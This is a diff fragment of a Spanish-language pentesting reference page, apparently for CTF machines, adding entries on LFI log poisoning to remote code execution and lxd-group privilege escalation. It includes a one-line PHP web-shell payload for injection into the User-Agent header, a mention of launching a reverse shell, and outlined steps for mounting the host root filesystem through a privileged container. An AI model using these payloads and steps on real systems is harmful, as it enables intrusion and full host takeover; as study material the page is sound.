+  "amenaza": "Convierte un LFI de «solo lectura» en ejecución de código. Es una técnica clásica y fiable cuando los logs son accesibles. No requiere más que control sobre un campo registrado. El riesgo es alto porque el resultado es RCE.",
+  "impacto": "La ejecución ocurre con los privilegios del servidor web. Desde ahí se enumera y se escala. Compromete el servidor por completo. Suele ser el foothold de la máquina.",
+  "rec": "Confirmar un LFI y localizar la ruta del log (access.log de Apache/Nginx).",
+  "conf": "Inyectar <code>&lt;?php system($_GET['c']); ?&gt;</code> en el User-Agent de una petición.",
+  "expl": "Incluir el log con el LFI pasando <code>&amp;c=comando</code> y lanzar una reverse shell."
+ },
+ "Grupo lxd": {
+  "ref": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation",
+  "sev": "high",
+  "intro": "Pertenecer al grupo lxd permite montar un contenedor con el disco del host y acceder a él como root.",
+  "points": [
+   "Se comprueba con <code>id</code> (grupo lxd/lxc).",
+   "Se crea un contenedor privilegiado que monta <code>/</code> del host.",
+   "Desde el contenedor se accede al FS del host como root.",
+   "Es equivalente a ser root en la máquina."
+  ],
+  "amenaza": "Pertenecer al grupo lxd equivale a root: la escalada es directa. Es una asignación de grupo peligrosa que a veces se concede sin pensar. No requiere exploits, solo las utilidades de lxd. El riesgo es alto porque el camino a root es inmediato.",
+  "impacto": "El resultado es lectura y escritura del sistema de ficheros del host como root. Desde ahí, control total del equipo. Suele ser el paso final de la cadena. El impacto es la toma completa del host.",
+  "rec": "Comprobar pertenencia al grupo con <code>id</code>.",
+  "conf": "Verificar que lxd/lxc está disponible e inicializado.",
+  "expl": "Importar una imagen Alpine, crear un contenedor privilegiado que monte <code>/</code> y leer/escribir el FS del host como root."
+ }
 }
 </script>
 
@@ -194,7 +787,7 @@ order: 2
   <div class="vb-modal-box vb-modal-wide" role="dialog" aria-modal="true" aria-label="Mapa de CVE">
     <button type="button" class="vb-modal-x" data-close aria-label="Cerrar">✕</button>
     <h2 class="vb-modal-title"><i class="fas fa-shield-virus"></i> Mapa de CVE</h2>
-    <p class="vb-cve-hint">Pincha en una fila para ver el detalle de la CVE.</p>
+    <p class="vb-cve-hint">Pincha en una fila para ver la ficha completa de la vulnerabilidad.</p>
     <div class="vb-cve-wrap"><table class="vb-cve-table" id="vb-cve-table"></table></div>
   </div>
 </div>
